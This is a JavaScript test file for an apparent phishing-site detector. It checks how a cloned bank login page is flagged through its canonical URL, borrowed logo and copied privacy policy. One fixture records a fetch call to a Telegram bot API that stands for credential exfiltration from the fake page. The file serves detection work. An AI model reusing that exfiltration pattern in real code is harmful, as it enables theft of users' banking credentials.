import { test } from "node:test";
import assert from "node:assert/strict";
import { readPageMeta, pageIdentityFindings, checkPrivacyPolicy } from "./page-identity.js";
import { buildKeyChecks } from "./key-checks.js";
import { classifySiteIntent } from "./intent.js";

const meta = (over = {}) => readPageMeta({ title: "", privacyLinks: [], assetHosts: [], exfil: [], hasCredentialField: false, ...over });
const titles = (fs) => fs.map((f) => f.title);

test("a cloned bank page gives itself away: canonical, title claim, borrowed logo, Telegram exfiltration", () => {
  const m = meta({
    title: "MCB Internet Banking - Login",
    canonical: "https://internet.mcb.mu/login",
    hasCredentialField: true,
    assetHosts: [{ host: "www.mcb.mu", kind: "image", locations: [{ file: "https://mcb-secure.top/", line: 12, code: '<img src="https://www.mcb.mu/logo.png">' }] }],
    exfil: [{ target: "Telegram bot API", locations: [{ file: "https://mcb-secure.top/app.js", line: 3, code: "fetch('https://api.telegram.org/bot123/sendMessage'" }] }],
  });
  const findings = pageIdentityFindings(m, "https://mcb-secure.top/login");
  assert.deepEqual(titles(findings), [
    "Page metadata points to another organisation's website",
    "Page claims to be another organisation and asks for credentials",
    "Page loads its branding from another organisation's website",
    "Page sends data to Telegram bot API",
  ]);
  assert.ok(findings.every((f) => f.hostile && f.category === "identity"));
  assert.equal(findings[2].locations[0].line, 12);
  assert.equal(classifySiteIntent({ reputation: null, grade: "A", findings }).kind, "malicious", "hostile even with a perfect grade");
});

test("the real bank's own site, and a news article about the bank, raise nothing", () => {
  const own = meta({ title: "MCB Internet Banking", canonical: "https://internet.mcb.mu/", hasCredentialField: true, assetHosts: [{ host: "cdn.mcb.mu", kind: "image" }] });
  assert.deepEqual(pageIdentityFindings(own, "https://internet.mcb.mu/"), []);
  const news = meta({ title: "MCB posts record profit", assetHosts: [{ host: "www.mcb.mu", kind: "image" }], hasCredentialField: false });
  assert.deepEqual(pageIdentityFindings(news, "https://lexpress.mu/article/1"), [], "no credential field, no claim");
});

test("right-click blocking and obfuscation are noted but never hostile", () => {
  const findings = pageIdentityFindings(meta({ contextMenuBlocked: true, obfuscation: true }), "https://old-gov-site.gov.mu/");
  assert.deepEqual(titles(findings).sort(), ["Page runs deliberately hidden (obfuscated) code", "Right-click is disabled"]);
  assert.ok(findings.every((f) => !f.hostile));
});

test("privacy policy: missing, own and working, broken, or copied from a real institution", async () => {
  assert.equal((await checkPrivacyPolicy(meta(), "https://shop.example/")).status, "missing");
  const ok = await checkPrivacyPolicy(meta({ privacyLinks: [{ href: "/privacy" }] }), "https://shop.example/", { fetch: async () => ({ status: 200 }) });
  assert.deepEqual([ok.status, ok.url], ["found", "https://shop.example/privacy"]);
  const broken = await checkPrivacyPolicy(meta({ privacyLinks: [{ href: "/privacy" }] }), "https://shop.example/", { fetch: async () => ({ status: 404 }) });
  assert.equal(broken.status, "broken");
  const copied = await checkPrivacyPolicy(meta({ privacyLinks: [{ href: "https://www.mcb.mu/en/privacy" }] }), "https://mcb-secure.top/");
  assert.equal(copied.status, "foreign");
  assert.equal(copied.finding.hostile, true);
  let fetched = false;
  await checkPrivacyPolicy(meta({ privacyLinks: [{ href: "https://termly.io/policy/123" }] }), "https://shop.example/", { fetch: async () => { fetched = true; return { status: 200 }; } });
  assert.equal(fetched, false, "never fetches another site's page");
});

test("key checks put certificate, domain age, lookalike, threat lists, metadata, privacy and kit code first", () => {
  const checks = buildKeyChecks({
    reputation: { signals: [], officialInstitution: null, domainAgeDays: 6, firstCertificateDays: null, certificate: { validation: "DV", organization: null, problem: null } },
    identityFindings: [],
    privacy: { status: "missing" },
    hasMeta: true,
    isHttps: true,
  });
  assert.deepEqual(checks.map((c) => c.id), ["certificate", "domain-age", "lookalike", "threat-lists", "metadata", "privacy-policy", "kit-code"]);
  const by = Object.fromEntries(checks.map((c) => [c.id, c]));
  assert.equal(by.certificate.status, "neutral");
  assert.match(by.certificate.detail, /not who runs the site/);
  assert.deepEqual([by["domain-age"].status, by["domain-age"].value], ["fail", "Registered 6 days ago"]);
  assert.equal(by["privacy-policy"].status, "warn");

  const ev = buildKeyChecks({
    reputation: { signals: [], officialInstitution: "MCB", domainAgeDays: 8883, certificate: { validation: "EV", organization: "The Mauritius Commercial Bank Limited", issuer: "DigiCert Inc", problem: null } },
    identityFindings: [], privacy: { status: "found" }, hasMeta: true, isHttps: true,
  });
  assert.deepEqual([ev[0].status, ev[0].value], ["pass", "Verified: The Mauritius Commercial Bank Limited"]);
  assert.match(ev[0].detail, /green address bar/);
});
